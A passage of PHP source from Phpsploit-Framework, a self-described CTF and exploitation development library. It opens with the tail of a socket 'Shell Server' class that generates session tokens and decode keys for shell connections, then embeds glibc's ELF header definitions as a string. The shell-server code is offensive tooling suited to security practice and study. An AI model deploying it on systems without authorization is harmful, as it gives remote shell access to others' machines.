                        Class_Base_Response::outputln ( "client socket connect is close : " . $_clientinfo[ "ip" ] . ":" . $_clientinfo[ "port" ] . " , time : " . date ( "Y-m-d H:i:s" , time () ) );
                    }
                    if ( $e->getMessage () == self::EXCEPTION_MESSAGE_CONNECT_EXIT ) {
                        throw new \Exception( self::EXCEPTION_MESSAGE_CONNECT_EXIT , self::EXCEPTION_BREAK );
                    }
                }

            } while ( true );

        } catch ( \Exception $e ) {
            Class_Base_Socket::close ( self::$_serverSocket );
            if ( ! is_cli () ) {
                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nShell Server is Stop , time : " . date ( "Y-m-d H:i:s" , time () ) . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( "\nShell Server is Stop , time : " . date ( "Y-m-d H:i:s" , time () ) );
            }
        }
    }

    public static function array_to_js_inner_html_string ( $array = array () )
    {
        return implode ( "\n" , $array ) . "\n";
    }

    public static function array_split_to_string ( $array = array () )
    {
        return implode ( "\n" , $array ) . "\n";
    }

    public static function check_browser_service_stop ()
    {
        if ( ! is_cli () ) {
            while ( ob_get_level () ) {
                ob_end_clean ();
            }
            Class_Base_Response::outputln ( "" );
            flush ();
            if ( connection_aborted () ) {
                throw new \Exception( self::EXCEPTION_MESSAGE_CONNECT_EXIT , self::EXCEPTION_BREAK );
            }
        }
    }

    public static function create_token ( $connect_domain_List_id = "connect_domain_list_id" )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        $_SESSION[ "SOCKET_SERVER_SHELL_TOKEN" ]            = md5 ( time () . rand ( 10000000 , 99999999 ) );
        $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_KEY" ]       = md5 ( time () . rand ( 10000000 , 99999999 ) );
        $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_IV_BASE64" ] = base64_encode ( openssl_random_pseudo_bytes ( openssl_cipher_iv_length ( "AES-256-CBC" ) ) );
        if ( ! is_cli () ) {
            while ( ob_get_level () ) {
                ob_end_clean ();
            }
        }
        if ( ! is_cli () ) {
            Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "socket connect authentication token : " . $_SESSION[ "SOCKET_SERVER_SHELL_TOKEN" ] . " , decode key : " . $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_KEY" ] . " , decode iv ( base64 ) : " . str_replace ( ' ' , '+' , $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_IV_BASE64" ] ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
        } else {
            Class_Base_Response::outputln ( "\n" . "token : " . $_SESSION[ "SOCKET_SERVER_SHELL_TOKEN" ] . " , decode key : " . $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_KEY" ] . " , decode iv ( base64 ) : " . $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_IV_BASE64" ] . "\n" );
        }
    }

    public static function get_token ()
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( empty( $_SESSION[ "SOCKET_SERVER_SHELL_TOKEN" ] ) ) {
            return null;
        }
        return $_SESSION[ "SOCKET_SERVER_SHELL_TOKEN" ];
    }

    public static function get_decode_key ()
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( empty( $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_KEY" ] ) ) {
            return null;
        }
        return $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_KEY" ];
    }

    public static function get_decode_iv ()
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( empty( $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_IV_BASE64" ] ) ) {
            return null;
        }
        return base64_decode ( $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_IV_BASE64" ] );
    }

    public static function out_token ( $connect_domain_List_id = "connect_domain_list_id" )
    {
        if ( ! is_cli () ) {
            while ( ob_get_level () ) {
                ob_end_clean ();
            }
        }
        if ( ! is_cli () ) {
            Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "socket connect authentication token : " . ( empty( self::get_token () ) ? "" : self::get_token () ) . ( " , decode key : " . self::get_decode_key () ) . ( " , decode iv ( base64 encoding ) : " . base64_encode ( self::get_decode_iv () ) ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
        } else {
            Class_Base_Response::outputln ( "\n" . "socket connect authentication token : " . ( empty( self::get_token () ) ? "" : self::get_token () ) . "\n" );
        }
    }

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-11
 * Time: 上午12:12
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Document_Elf64 extends Class_Base_Document
{
    public static function get_content_elf_h ()
    {
        $_string = '/* This file defines standard ELF types, structures, and macros.
   Copyright (C) 1995-2022 Free Software Foundation, Inc.
   This file is part of the GNU C Library.

   The GNU C Library is free software; you can redistribute it and/or
   modify it under the terms of the GNU Lesser General Public
   License as published by the Free Software Foundation; either
   version 2.1 of the License, or (at your option) any later version.

   The GNU C Library is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
   Lesser General Public License for more details.

   You should have received a copy of the GNU Lesser General Public
   License along with the GNU C Library; if not, see  <https://www.gnu.org/licenses/> .  
*/

#ifndef _ELF_H
#define	_ELF_H 1

/* Standard ELF types.  */

#include <stdint.h>

/* Type for a 16-bit quantity.  */
typedef uint16_t Elf32_Half;
typedef uint16_t Elf64_Half;

/* Types for signed and unsigned 32-bit quantities.  */
typedef uint32_t Elf32_Word;
typedef	int32_t  Elf32_Sword;
typedef uint32_t Elf64_Word;
typedef	int32_t  Elf64_Sword;

/* Types for signed and unsigned 64-bit quantities.  */
typedef uint64_t Elf32_Xword;
typedef	int64_t  Elf32_Sxword;
typedef uint64_t Elf64_Xword;
typedef	int64_t  Elf64_Sxword;

/* Type of addresses.  */
typedef uint32_t Elf32_Addr;
typedef uint64_t Elf64_Addr;

/* Type of file offsets.  */
typedef uint32_t Elf32_Off;
typedef uint64_t Elf64_Off;

/* Type for section indices, which are 16-bit quantities.  */
typedef uint16_t Elf32_Section;
typedef uint16_t Elf64_Section;

/* Type for version symbol information.  */
typedef Elf32_Half Elf32_Versym;
typedef Elf64_Half Elf64_Versym;


/* The ELF file header.  This appears at the start of every ELF file.  */

#define EI_NIDENT (16)

typedef struct
{
  unsigned char	e_ident[EI_NIDENT];	/* Magic number and other info */
  Elf32_Half	e_type;			/* Object file type */
  Elf32_Half	e_machine;		/* Architecture */
  Elf32_Word	e_version;		/* Object file version */
  Elf32_Addr	e_entry;		/* Entry point virtual address */
  Elf32_Off	e_phoff;		/* Program header table file offset */
  Elf32_Off	e_shoff;		/* Section header table file offset */
  Elf32_Word	e_flags;		/* Processor-specific flags */
  Elf32_Half	e_ehsize;		/* ELF header size in bytes */
  Elf32_Half	e_phentsize;		/* Program header table entry size */
  Elf32_Half	e_phnum;		/* Program header table entry count */
  Elf32_Half	e_shentsize;		/* Section header table entry size */
  Elf32_Half	e_shnum;		/* Section header table entry count */
  Elf32_Half	e_shstrndx;		/* Section header string table index */
} Elf32_Ehdr;

typedef struct
{
  unsigned char	e_ident[EI_NIDENT];	/* Magic number and other info */
  Elf64_Half	e_type;			/* Object file type */
  Elf64_Half	e_machine;		/* Architecture */
  Elf64_Word	e_version;		/* Object file version */
  Elf64_Addr	e_entry;		/* Entry point virtual address */
  Elf64_Off	e_phoff;		/* Program header table file offset */
  Elf64_Off	e_shoff;		/* Section header table file offset */
  Elf64_Word	e_flags;		/* Processor-specific flags */
  Elf64_Half	e_ehsize;		/* ELF header size in bytes */
  Elf64_Half	e_phentsize;		/* Program header table entry size */
  Elf64_Half	e_phnum;		/* Program header table entry count */
  Elf64_Half	e_shentsize;		/* Section header table entry size */
  Elf64_Half	e_shnum;		/* Section header table entry count */
  Elf64_Half	e_shstrndx;		/* Section header string table index */
} Elf64_Ehdr;

/* Fields in the e_ident array.  The EI_* macros are indices into the
   array.  The macros under each EI_* macro are the values the byte
   may have.  */

#define EI_MAG0		0		/* File identification byte 0 index */
#define ELFMAG0		0x7f		/* Magic number byte 0 */

#define EI_MAG1		1		/* File identification byte 1 index */
#define ELFMAG1		\'E\'		/* Magic number byte 1 */

#define EI_MAG2		2		/* File identification byte 2 index */
#define ELFMAG2		\'L\'		/* Magic number byte 2 */

#define EI_MAG3		3		/* File identification byte 3 index */
#define ELFMAG3		\'F\'		/* Magic number byte 3 */

/* Conglomeration of the identification bytes, for easy testing as a word.  */
#define	ELFMAG		"\177ELF"
#define	SELFMAG		4

#define EI_CLASS	4		/* File class byte index */
#define ELFCLASSNONE	0		/* Invalid class */
#define ELFCLASS32	1		/* 32-bit objects */
#define ELFCLASS64	2		/* 64-bit objects */
#define ELFCLASSNUM	3

#define EI_DATA		5		/* Data encoding byte index */
#define ELFDATANONE	0		/* Invalid data encoding */
#define ELFDATA2LSB	1		/* 2\'s complement, little endian */
#define ELFDATA2MSB	2		/* 2\'s complement, big endian */
#define ELFDATANUM	3

#define EI_VERSION	6		/* File version byte index */
					/* Value must be EV_CURRENT */

#define EI_OSABI	7		/* OS ABI identification */
#define ELFOSABI_NONE		0	/* UNIX System V ABI */
#define ELFOSABI_SYSV		0	/* Alias.  */
#define ELFOSABI_HPUX		1	/* HP-UX */
#define ELFOSABI_NETBSD		2	/* NetBSD.  */
#define ELFOSABI_GNU		3	/* Object uses GNU ELF extensions.  */
#define ELFOSABI_LINUX		ELFOSABI_GNU /* Compatibility alias.  */
#define ELFOSABI_SOLARIS	6	/* Sun Solaris.  */
#define ELFOSABI_AIX		7	/* IBM AIX.  */
#define ELFOSABI_IRIX		8	/* SGI Irix.  */
#define ELFOSABI_FREEBSD	9	/* FreeBSD.  */
#define ELFOSABI_TRU64		10	/* Compaq TRU64 UNIX.  */
#define ELFOSABI_MODESTO	11	/* Novell Modesto.  */
#define ELFOSABI_OPENBSD	12	/* OpenBSD.  */
#define ELFOSABI_ARM_AEABI	64	/* ARM EABI */
#define ELFOSABI_ARM		97	/* ARM */
#define ELFOSABI_STANDALONE	255	/* Standalone (embedded) application */

#define EI_ABIVERSION	8		/* ABI version */

#define EI_PAD		9		/* Byte index of padding bytes */

/* Legal values for e_type (object file type).  */

#define ET_NONE		0		/* No file type */
#define ET_REL		1		/* Relocatable file */
#define ET_EXEC		2		/* Executable file */
#define ET_DYN		3		/* Shared object file */
#define ET_CORE		4		/* Core file */
#define	ET_NUM		5		/* Number of defined types */
#define ET_LOOS		0xfe00		/* OS-specific range start */
#define ET_HIOS		0xfeff		/* OS-specific range end */
#define ET_LOPROC	0xff00		/* Processor-specific range start */
#define ET_HIPROC	0xffff		/* Processor-specific range end */

/* Legal values for e_machine (architecture).  */

#define EM_NONE		 0	/* No machine */
#define EM_M32		 1	/* AT&T WE 32100 */
#define EM_SPARC	 2	/* SUN SPARC */
#define EM_386		 3	/* Intel 80386 */
#define EM_68K		 4	/* Motorola m68k family */
#define EM_88K		 5	/* Motorola m88k family */
#define EM_IAMCU	 6	/* Intel MCU */
#define EM_860		 7	/* Intel 80860 */
#define EM_MIPS		 8	/* MIPS R3000 big-endian */
#define EM_S370		 9	/* IBM System/370 */
#define EM_MIPS_RS3_LE	10	/* MIPS R3000 little-endian */
				/* reserved 11-14 */
#define EM_PARISC	15	/* HPPA */
				/* reserved 16 */
#define EM_VPP500	17	/* Fujitsu VPP500 */
#define EM_SPARC32PLUS	18	/* Sun\'s "v8plus" */
#define EM_960		19	/* Intel 80960 */
#define EM_PPC		20	/* PowerPC */
#define EM_PPC64	21	/* PowerPC 64-bit */
#define EM_S390		22	/* IBM S390 */
#define EM_SPU		23	/* IBM SPU/SPC */
				/* reserved 24-35 */
#define EM_V800		36	/* NEC V800 series */
#define EM_FR20		37	/* Fujitsu FR20 */
#define EM_RH32		38	/* TRW RH-32 */
#define EM_RCE		39	/* Motorola RCE */
#define EM_ARM		40	/* ARM */
#define EM_FAKE_ALPHA	41	/* Digital Alpha */
#define EM_SH		42	/* Hitachi SH */
#define EM_SPARCV9	43	/* SPARC v9 64-bit */
#define EM_TRICORE	44	/* Siemens Tricore */
#define EM_ARC		45	/* Argonaut RISC Core */
#define EM_H8_300	46	/* Hitachi H8/300 */
#define EM_H8_300H	47	/* Hitachi H8/300H */
#define EM_H8S		48	/* Hitachi H8S */
#define EM_H8_500	49	/* Hitachi H8/500 */
#define EM_IA_64	50	/* Intel Merced */
#define EM_MIPS_X	51	/* Stanford MIPS-X */
#define EM_COLDFIRE	52	/* Motorola Coldfire */
#define EM_68HC12	53	/* Motorola M68HC12 */
#define EM_MMA		54	/* Fujitsu MMA Multimedia Accelerator */
#define EM_PCP		55	/* Siemens PCP */
#define EM_NCPU		56	/* Sony nCPU embeeded RISC */
#define EM_NDR1		57	/* Denso NDR1 microprocessor */
#define EM_STARCORE	58	/* Motorola Start*Core processor */
#define EM_ME16		59	/* Toyota ME16 processor */
#define EM_ST100	60	/* STMicroelectronic ST100 processor */
#define EM_TINYJ	61	/* Advanced Logic Corp. Tinyj emb.fam */
#define EM_X86_64	62	/* AMD x86-64 architecture */
#define EM_PDSP		63	/* Sony DSP Processor */
#define EM_PDP10	64	/* Digital PDP-10 */
#define EM_PDP11	65	/* Digital PDP-11 */
#define EM_FX66		66	/* Siemens FX66 microcontroller */
#define EM_ST9PLUS	67	/* STMicroelectronics ST9+ 8/16 mc */
#define EM_ST7		68	/* STmicroelectronics ST7 8 bit mc */
#define EM_68HC16	69	/* Motorola MC68HC16 microcontroller */
#define EM_68HC11	70	/* Motorola MC68HC11 microcontroller */
#define EM_68HC08	71	/* Motorola MC68HC08 microcontroller */
#define EM_68HC05	72	/* Motorola MC68HC05 microcontroller */
#define EM_SVX		73	/* Silicon Graphics SVx */
#define EM_ST19		74	/* STMicroelectronics ST19 8 bit mc */
#define EM_VAX		75	/* Digital VAX */
#define EM_CRIS		76	/* Axis Communications 32-bit emb.proc */
#define EM_JAVELIN	77	/* Infineon Technologies 32-bit emb.proc */
#define EM_FIREPATH	78	/* Element 14 64-bit DSP Processor */
#define EM_ZSP		79	/* LSI Logic 16-bit DSP Processor */
#define EM_MMIX		80	/* Donald Knuth\'s educational 64-bit proc */
#define EM_HUANY	81	/* Harvard University machine-independent object files */
#define EM_PRISM	82	/* SiTera Prism */
#define EM_AVR		83	/* Atmel AVR 8-bit microcontroller */
#define EM_FR30		84	/* Fujitsu FR30 */
#define EM_D10V		85	/* Mitsubishi D10V */
#define EM_D30V		86	/* Mitsubishi D30V */
#define EM_V850		87	/* NEC v850 */
#define EM_M32R		88	/* Mitsubishi M32R */
#define EM_MN10300	89	/* Matsushita MN10300 */
#define EM_MN10200	90	/* Matsushita MN10200 */
#define EM_PJ		91	/* picoJava */
#define EM_OPENRISC	92	/* OpenRISC 32-bit embedded processor */
#define EM_ARC_COMPACT	93	/* ARC International ARCompact */
#define EM_XTENSA	94	/* Tensilica Xtensa Architecture */
#define EM_VIDEOCORE	95	/* Alphamosaic VideoCore */
#define EM_TMM_GPP	96	/* Thompson Multimedia General Purpose Proc */
#define EM_NS32K	97	/* National Semi. 32000 */
#define EM_TPC		98	/* Tenor Network TPC */
#define EM_SNP1K	99	/* Trebia SNP 1000 */
#define EM_ST200	100	/* STMicroelectronics ST200 */
#define EM_IP2K		101	/* Ubicom IP2xxx */
#define EM_MAX		102	/* MAX processor */
#define EM_CR		103	/* National Semi. CompactRISC */
#define EM_F2MC16	104	/* Fujitsu F2MC16 */
#define EM_MSP430	105	/* Texas Instruments msp430 */
#define EM_BLACKFIN	106	/* Analog Devices Blackfin DSP */
#define EM_SE_C33	107	/* Seiko Epson S1C33 family */
#define EM_SEP		108	/* Sharp embedded microprocessor */
#define EM_ARCA		109	/* Arca RISC */
#define EM_UNICORE	110	/* PKU-Unity & MPRC Peking Uni. mc series */
#define EM_EXCESS	111	/* eXcess configurable cpu */
#define EM_DXP		112	/* Icera Semi. Deep Execution Processor */
#define EM_ALTERA_NIOS2 113	/* Altera Nios II */
#define EM_CRX		114	/* National Semi. CompactRISC CRX */
#define EM_XGATE	115	/* Motorola XGATE */
#define EM_C166		116	/* Infineon C16x/XC16x */
#define EM_M16C		117	/* Renesas M16C */
#define EM_DSPIC30F	118	/* Microchip Technology dsPIC30F */
#define EM_CE		119	/* Freescale Communication Engine RISC */
#define EM_M32C		120	/* Renesas M32C */
				/* reserved 121-130 */
#define EM_TSK3000	131	/* Altium TSK3000 */
#define EM_RS08		132	/* Freescale RS08 */
#define EM_SHARC	133	/* Analog Devices SHARC family */
#define EM_ECOG2	134	/* Cyan Technology eCOG2 */
#define EM_SCORE7	135	/* Sunplus S+core7 RISC */
#define EM_DSP24	136	/* New Japan Radio (NJR) 24-bit DSP */
#define EM_VIDEOCORE3	137	/* Broadcom VideoCore III */
#define EM_LATTICEMICO32 138	/* RISC for Lattice FPGA */
#define EM_SE_C17	139	/* Seiko Epson C17 */
#define EM_TI_C6000	140	/* Texas Instruments TMS320C6000 DSP */
#define EM_TI_C2000	141	/* Texas Instruments TMS320C2000 DSP */
#define EM_TI_C5500	142	/* Texas Instruments TMS320C55x DSP */
#define EM_TI_ARP32	143	/* Texas Instruments App. Specific RISC */
#define EM_TI_PRU	144	/* Texas Instruments Prog. Realtime Unit */
				/* reserved 145-159 */
#define EM_MMDSP_PLUS	160	/* STMicroelectronics 64bit VLIW DSP */
#define EM_CYPRESS_M8C	161	/* Cypress M8C */
#define EM_R32C		162	/* Renesas R32C */
#define EM_TRIMEDIA	163	/* NXP Semi. TriMedia */
#define EM_QDSP6	164	/* QUALCOMM DSP6 */
#define EM_8051		165	/* Intel 8051 and variants */
#define EM_STXP7X	166	/* STMicroelectronics STxP7x */
#define EM_NDS32	167	/* Andes Tech. compact code emb. RISC */
#define EM_ECOG1X	168	/* Cyan Technology eCOG1X */
#define EM_MAXQ30	169	/* Dallas Semi. MAXQ30 mc */
#define EM_XIMO16	170	/* New Japan Radio (NJR) 16-bit DSP */
#define EM_MANIK	171	/* M2000 Reconfigurable RISC */
#define EM_CRAYNV2	172	/* Cray NV2 vector architecture */
#define EM_RX		173	/* Renesas RX */
#define EM_METAG	174	/* Imagination Tech. META */
#define EM_MCST_ELBRUS	175	/* MCST Elbrus */
#define EM_ECOG16	176	/* Cyan Technology eCOG16 */
#define EM_CR16		177	/* National Semi. CompactRISC CR16 */
#define EM_ETPU		178	/* Freescale Extended Time Processing Unit */
#define EM_SLE9X	179	/* Infineon Tech. SLE9X */
#define EM_L10M		180	/* Intel L10M */
#define EM_K10M		181	/* Intel K10M */
				/* reserved 182 */
#define EM_AARCH64	183	/* ARM AARCH64 */
				/* reserved 184 */
#define EM_AVR32	185	/* Amtel 32-bit microprocessor */
#define EM_STM8		186	/* STMicroelectronics STM8 */
#define EM_TILE64	187	/* Tilera TILE64 */
#define EM_TILEPRO	188	/* Tilera TILEPro */
#define EM_MICROBLAZE	189	/* Xilinx MicroBlaze */
#define EM_CUDA		190	/* NVIDIA CUDA */
#define EM_TILEGX	191	/* Tilera TILE-Gx */
#define EM_CLOUDSHIELD	192	/* CloudShield */
#define EM_COREA_1ST	193	/* KIPO-KAIST Core-A 1st gen. */
#define EM_COREA_2ND	194	/* KIPO-KAIST Core-A 2nd gen. */
#define EM_ARCV2	195	/* Synopsys ARCv2 ISA.  */
#define EM_OPEN8	196	/* Open8 RISC */
#define EM_RL78		197	/* Renesas RL78 */
#define EM_VIDEOCORE5	198	/* Broadcom VideoCore V */
#define EM_78KOR	199	/* Renesas 78KOR */
#define EM_56800EX	200	/* Freescale 56800EX DSC */
#define EM_BA1		201	/* Beyond BA1 */
#define EM_BA2		202	/* Beyond BA2 */
#define EM_XCORE	203	/* XMOS xCORE */
#define EM_MCHP_PIC	204	/* Microchip 8-bit PIC(r) */
#define EM_INTELGT	205	/* Intel Graphics Technology */
				/* reserved 206-209 */
#define EM_KM32		210	/* KM211 KM32 */
#define EM_KMX32	211	/* KM211 KMX32 */
#define EM_EMX16	212	/* KM211 KMX16 */
#define EM_EMX8		213	/* KM211 KMX8 */
#define EM_KVARC	214	/* KM211 KVARC */
#define EM_CDP		215	/* Paneve CDP */
#define EM_COGE		216	/* Cognitive Smart Memory Processor */
#define EM_COOL		217	/* Bluechip CoolEngine */
#define EM_NORC		218	/* Nanoradio Optimized RISC */
#define EM_CSR_KALIMBA	219	/* CSR Kalimba */
#define EM_Z80		220	/* Zilog Z80 */
#define EM_VISIUM	221	/* Controls and Data Services VISIUMcore */
#define EM_FT32		222	/* FTDI Chip FT32 */
#define EM_MOXIE	223	/* Moxie processor */
#define EM_AMDGPU	224	/* AMD GPU */
				/* reserved 225-242 */
#define EM_RISCV	243	/* RISC-V */

#define EM_BPF		247	/* Linux BPF -- in-kernel virtual machine */
#define EM_CSKY		252     /* C-SKY */
#define EM_LOONGARCH	258	/* LoongArch */

#define EM_NUM		259

/* Old spellings/synonyms.  */

#define EM_ARC_A5	EM_ARC_COMPACT

/* If it is necessary to assign new unofficial EM_* values, please
   pick large random numbers (0x8523, 0xa7f2, etc.) to minimize the
   chances of collision with official or non-GNU unofficial values.  */

#define EM_ALPHA	0x9026

/* Legal values for e_version (version).  */

#define EV_NONE		0		/* Invalid ELF version */
#define EV_CURRENT	1		/* Current version */
#define EV_NUM		2

/* Section header.  */

typedef struct
{
  Elf32_Word	sh_name;		/* Section name (string tbl index) */
  Elf32_Word	sh_type;		/* Section type */
  Elf32_Word	sh_flags;		/* Section flags */
  Elf32_Addr	sh_addr;		/* Section virtual addr at execution */
  Elf32_Off	sh_offset;		/* Section file offset */
  Elf32_Word	sh_size;		/* Section size in bytes */
  Elf32_Word	sh_link;		/* Link to another section */
  Elf32_Word	sh_info;		/* Additional section information */
  Elf32_Word	sh_addralign;		/* Section alignment */
  Elf32_Word	sh_entsize;		/* Entry size if section holds table */
} Elf32_Shdr;

typedef struct
{
  Elf64_Word	sh_name;		/* Section name (string tbl index) */
  Elf64_Word	sh_type;		/* Section type */
  Elf64_Xword	sh_flags;		/* Section flags */
  Elf64_Addr	sh_addr;		/* Section virtual addr at execution */
  Elf64_Off	sh_offset;		/* Section file offset */
  Elf64_Xword	sh_size;		/* Section size in bytes */
  Elf64_Word	sh_link;		/* Link to another section */
  Elf64_Word	sh_info;		/* Additional section information */
  Elf64_Xword	sh_addralign;		/* Section alignment */
  Elf64_Xword	sh_entsize;		/* Entry size if section holds table */
} Elf64_Shdr;

/* Special section indices.  */

#define SHN_UNDEF	0		/* Undefined section */
#define SHN_LORESERVE	0xff00		/* Start of reserved indices */
#define SHN_LOPROC	0xff00		/* Start of processor-specific */
#define SHN_BEFORE	0xff00		/* Order section before all others
					   (Solaris).  */
#define SHN_AFTER	0xff01		/* Order section after all others
					   (Solaris).  */
#define SHN_HIPROC	0xff1f		/* End of processor-specific */
#define SHN_LOOS	0xff20		/* Start of OS-specific */
#define SHN_HIOS	0xff3f		/* End of OS-specific */
#define SHN_ABS		0xfff1		/* Associated symbol is absolute */
#define SHN_COMMON	0xfff2		/* Associated symbol is common */
#define SHN_XINDEX	0xffff		/* Index is in extra table.  */
#define SHN_HIRESERVE	0xffff		/* End of reserved indices */

/* Legal values for sh_type (section type).  */

#define SHT_NULL	  0		/* Section header table entry unused */
#define SHT_PROGBITS	  1		/* Program data */
#define SHT_SYMTAB	  2		/* Symbol table */
#define SHT_STRTAB	  3		/* String table */
#define SHT_RELA	  4		/* Relocation entries with addends */
#define SHT_HASH	  5		/* Symbol hash table */
#define SHT_DYNAMIC	  6		/* Dynamic linking information */
#define SHT_NOTE	  7		/* Notes */
#define SHT_NOBITS	  8		/* Program space with no data (bss) */
#define SHT_REL		  9		/* Relocation entries, no addends */
#define SHT_SHLIB	  10		/* Reserved */
#define SHT_DYNSYM	  11		/* Dynamic linker symbol table */
#define SHT_INIT_ARRAY	  14		/* Array of constructors */
#define SHT_FINI_ARRAY	  15		/* Array of destructors */
#define SHT_PREINIT_ARRAY 16		/* Array of pre-constructors */
#define SHT_GROUP	  17		/* Section group */
#define SHT_SYMTAB_SHNDX  18		/* Extended section indices */
#define SHT_RELR	  19            /* RELR relative relocations */
#define	SHT_NUM		  20		/* Number of defined types.  */
#define SHT_LOOS	  0x60000000	/* Start OS-specific.  */
#define SHT_GNU_ATTRIBUTES 0x6ffffff5	/* Object attributes.  */
#define SHT_GNU_HASH	  0x6ffffff6	/* GNU-style hash table.  */
#define SHT_GNU_LIBLIST	  0x6ffffff7	/* Prelink library list */
#define SHT_CHECKSUM	  0x6ffffff8	/* Checksum for DSO content.  */
#define SHT_LOSUNW	  0x6ffffffa	/* Sun-specific low bound.  */
#define SHT_SUNW_move	  0x6ffffffa
#define SHT_SUNW_COMDAT   0x6ffffffb
#define SHT_SUNW_syminfo  0x6ffffffc
#define SHT_GNU_verdef	  0x6ffffffd	/* Version definition section.  */
#define SHT_GNU_verneed	  0x6ffffffe	/* Version needs section.  */
#define SHT_GNU_versym	  0x6fffffff	/* Version symbol table.  */
#define SHT_HISUNW	  0x6fffffff	/* Sun-specific high bound.  */
#define SHT_HIOS	  0x6fffffff	/* End OS-specific type */
#define SHT_LOPROC	  0x70000000	/* Start of processor-specific */
#define SHT_HIPROC	  0x7fffffff	/* End of processor-specific */
#define SHT_LOUSER	  0x80000000	/* Start of application-specific */
#define SHT_HIUSER	  0x8fffffff	/* End of application-specific */

/* Legal values for sh_flags (section flags).  */

#define SHF_WRITE	     (1 << 0)	/* Writable */
#define SHF_ALLOC	     (1 << 1)	/* Occupies memory during execution */
#define SHF_EXECINSTR	     (1 << 2)	/* Executable */
#define SHF_MERGE	     (1 << 4)	/* Might be merged */
#define SHF_STRINGS	     (1 << 5)	/* Contains nul-terminated strings */
#define SHF_INFO_LINK	     (1 << 6)	/* `sh_info\' contains SHT index */
#define SHF_LINK_ORDER	     (1 << 7)	/* Preserve order after combining */
#define SHF_OS_NONCONFORMING (1 << 8)	/* Non-standard OS specific handling
					   required */
#define SHF_GROUP	     (1 << 9)	/* Section is member of a group.  */
#define SHF_TLS		     (1 << 10)	/* Section hold thread-local data.  */
#define SHF_COMPRESSED	     (1 << 11)	/* Section with compressed data. */
#define SHF_MASKOS	     0x0ff00000	/* OS-specific.  */
#define SHF_MASKPROC	     0xf0000000	/* Processor-specific */
#define SHF_GNU_RETAIN	     (1 << 21)  /* Not to be GCed by linker.  */
#define SHF_ORDERED	     (1 << 30)	/* Special ordering requirement
					   (Solaris).  */
#define SHF_EXCLUDE	     (1U << 31)	/* Section is excluded unless
					   referenced or allocated (Solaris).*/

/* Section compression header.  Used when SHF_COMPRESSED is set.  */

typedef struct
{
  Elf32_Word	ch_type;	/* Compression format.  */
  Elf32_Word	ch_size;	/* Uncompressed data size.  */
  Elf32_Word	ch_addralign;	/* Uncompressed data alignment.  */
} Elf32_Chdr;

typedef struct
{
  Elf64_Word	ch_type;	/* Compression format.  */
  Elf64_Word	ch_reserved;
  Elf64_Xword	ch_size;	/* Uncompressed data size.  */
  Elf64_Xword	ch_addralign;	/* Uncompressed data alignment.  */
} Elf64_Chdr;

/* Legal values for ch_type (compression algorithm).  */
#define ELFCOMPRESS_ZLIB	1	   /* ZLIB/DEFLATE algorithm.  */
#define ELFCOMPRESS_LOOS	0x60000000 /* Start of OS-specific.  */
#define ELFCOMPRESS_HIOS	0x6fffffff /* End of OS-specific.  */
#define ELFCOMPRESS_LOPROC	0x70000000 /* Start of processor-specific.  */
#define ELFCOMPRESS_HIPROC	0x7fffffff /* End of processor-specific.  */

/* Section group handling.  */
#define GRP_COMDAT	0x1		/* Mark group as COMDAT.  */

/* Symbol table entry.  */

typedef struct
{
  Elf32_Word	st_name;		/* Symbol name (string tbl index) */
  Elf32_Addr	st_value;		/* Symbol value */
  Elf32_Word	st_size;		/* Symbol size */
  unsigned char	st_info;		/* Symbol type and binding */
  unsigned char	st_other;		/* Symbol visibility */
  Elf32_Section	st_shndx;		/* Section index */
} Elf32_Sym;

typedef struct
{
  Elf64_Word	st_name;		/* Symbol name (string tbl index) */
  unsigned char	st_info;		/* Symbol type and binding */
  unsigned char st_other;		/* Symbol visibility */
  Elf64_Section	st_shndx;		/* Section index */
  Elf64_Addr	st_value;		/* Symbol value */
  Elf64_Xword	st_size;		/* Symbol size */
} Elf64_Sym;

/* The syminfo section if available contains additional information about
   every dynamic symbol.  */

typedef struct
{
  Elf32_Half si_boundto;		/* Direct bindings, symbol bound to */
  Elf32_Half si_flags;			/* Per symbol flags */
} Elf32_Syminfo;

typedef struct
{
  Elf64_Half si_boundto;		/* Direct bindings, symbol bound to */
  Elf64_Half si_flags;			/* Per symbol flags */
} Elf64_Syminfo;

/* Possible values for si_boundto.  */
#define SYMINFO_BT_SELF		0xffff	/* Symbol bound to self */
